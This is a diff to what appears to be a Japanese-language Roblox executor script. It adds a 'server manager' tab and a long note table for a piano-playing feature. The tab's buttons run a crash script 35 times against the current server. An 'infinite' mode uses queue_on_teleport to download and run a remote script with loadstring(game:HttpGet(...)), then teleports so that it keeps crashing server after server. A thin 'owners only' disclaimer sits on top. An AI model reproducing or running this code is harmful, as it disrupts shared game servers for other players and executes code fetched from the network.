+            pcall(function() sendChatMessage("1") end)
+            if onFinish then onFinish() end
+        end)
+    end
+
+    -- ========================================================================
+    -- queue_on_teleport 対応判定
+    -- ========================================================================
+    local function hasQueueOnTeleport()
+        return (type(queue_on_teleport) == "function")
+            or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
+    end
+
+    local function callQueueOnTeleport(script)
+        if type(queue_on_teleport) == "function" then
+            return pcall(function() queue_on_teleport(script) end)
+        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+            return pcall(function() syn.queue_on_teleport(script) end)
+        end
+        return false
+    end
+
+    -- ========================================================================
+    -- タブ作成
+    -- ========================================================================
+    local CrashTab = Window:MakeTab({
+        Name = "サーバーマネージャー",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    CrashTab:AddParagraph(
+        "⚠️ 悪用禁止",
+        "サーバーオーナー用の試験向け機能です。\n" ..
+        "他人のサーバーで実行しないでください。"
+    )
+
+    CrashTab:AddSection({ Name = "試験実行" })
+
+    -- ========================================================================
+    -- ① 単独（クラッシュテスト）
+    --    sPciZuXM を35回実行するだけ。テレポートしない。
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "⚡ サーバークラッシュテスト（単独・35回連続実行）",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "単独クラッシュテスト",
+                Content = "35回連続実行を開始します...",
+                Time = 3
+            })
+            task.spawn(function()
+                local ok, err = runCrashScript()
+                if ok then
+                    PlayActionSound()
+                    OrionLib:MakeNotification({
+                        Name = "完了",
+                        Content = "35回の実行が完了しました",
+                        Time = 5
+                    })
+                else
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "エラー",
+                        Content = "失敗: " .. tostring(err),
+                        Time = 5
+                    })
+                end
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- ② オート無限
+    --    1回目（このサーバー）：
+    --      カウントダウン → uPime032 を queue_on_teleport に予約
+    --      テレポート発火 → このサーバーでも sPciZuXM（35回）を実行
+    --    2回目以降（新サーバー）：
+    --      uPime032 が自動ロード → カウントダウン・クラッシュ・テレポート・自己予約を担当
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "🔁 サーバークラッシュオートモード（無限ループ）",
+        Callback = function()
+            PlayActionSound()
+
+            if not hasQueueOnTeleport() then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "❌ 実行不可能",
+                    Content = "このエグゼキュータは queue_on_teleport に対応していません。無限ループは実行できません。",
+                    Time = 8
+                })
+                return
+            end
+
+            OrionLib:MakeNotification({
+                Name = "🔁 オート無限",
+                Content = "カウントダウン開始 → このサーバーでも35回クラッシュを実行します",
+                Time = 3
+            })
+
+            runCountdownOnce(function()
+                -- 次のサーバーで uPime032 を単純にロードするだけ予約
+                local nextScript = string.format([[
+loadstring(game:HttpGet("%s"))()
+]], AUTOLOGIC_URL)
+                local ok = callQueueOnTeleport(nextScript)
+                if not ok then
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "エラー",
+                        Content = "queue_on_teleport の予約に失敗しました",
+                        Time = 4
+                    })
+                    return
+                end
+
+                -- テレポート発火（クラッシュより先）
+                task.spawn(function() teleportToAnotherServer() end)
+                task.wait(0.1)
+
+                -- このサーバーでも sPciZuXM（35回）を実行
+                task.spawn(function()
+                    local crashOk = runCrashScript()
+                    if crashOk then
+                        PlayActionSound()
+                        OrionLib:MakeNotification({
+                            Name = "初回クラッシュ実行",
+                            Content = "uPime032 を予約済み・別サーバーへ移動中",
+                            Time = 4
+                        })
+                    else
+                        PlayErrorSound()
+                    end
+                end)
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- 情報
+    -- ========================================================================
+    CrashTab:AddSection({ Name = "情報" })
+    CrashTab:AddParagraph(
+        "使い分け",
+        "① 単独: sPciZuXM を35回実行（このサーバーで完結）\n" ..
+        "② オート無限: カウントダウン → uPime032 を予約 → テレポート発火 → このサーバーで35回クラッシュ\n" ..
+        "   新サーバー到着後、uPime032 がカウントダウン・クラッシュ・テレポート・自己予約を行い無限ループ。"
+    )
+    CrashTab:AddParagraph(
+        "使用URL",
+        "・クラッシュ単独: " .. CRASH_URL .. "\n" ..
+        "・オート無限: " .. AUTOLOGIC_URL
+    )
+    CrashTab:AddParagraph(
+        "注意事項",
+        "・queue_on_teleport 非対応エグゼキュータでは無限ループは動作しません\n" ..
+        "・公開サーバーが枯渇すると Teleport() のフォールバックが使用されます\n" ..
+        "・連続テレポート＋クラッシュは Roblox 規約違反です（自己責任）"
+    )
+end
+
+-- ============================================================================
 -- ブロック32: 汽車を乗っ取るタブ
 -- ============================================================================
 do
@@ -4843,7 +5294,7 @@ do
 end
 
 -- ============================================================================
--- ブロック33: 楽譜演奏タブ
+-- ブロック33: 楽譜演奏タブ（少女A + 공격전이다 + MONTAGEM_HIKARI デフォルト曲）
 -- ============================================================================
 do
     local Window = _G.Window
@@ -4865,6 +5316,1730 @@ do
         end
     end })
 
+    -- ========================================================================
+    -- デフォルト曲：少女A
+    -- ========================================================================
+    local DEFAULT_SONG_SHOJO_A = [[
+[
+  {"key": "Key1Gsharp", "delay": 0},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 1},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 1},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 1},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Dsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.5},
+  {"key": "Key2Gsharp", "delay": 0.5},
+  {"key": "Key3C", "delay": 1},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.375},
+  {"key": "Key2F", "delay": 0.125},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Gsharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.375},
+  {"key": "Key2F", "delay": 0.125},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key2Gsharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key1Dsharp", "delay": 0.125},
+  {"key": "Key3C", "delay": 0.125},
+  {"key": "Key1Dsharp", "delay": 0.25},
+  {"key": "Key3Asharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3B", "delay": 2.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key3A", "delay": 0.625},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key3A", "delay": 0.625},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1Fsharp", "delay": 0.375},
+  {"key": "Key3A", "delay": 0.625},
+  {"key": "Key1Fsharp", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1Fsharp", "delay": 0.25},
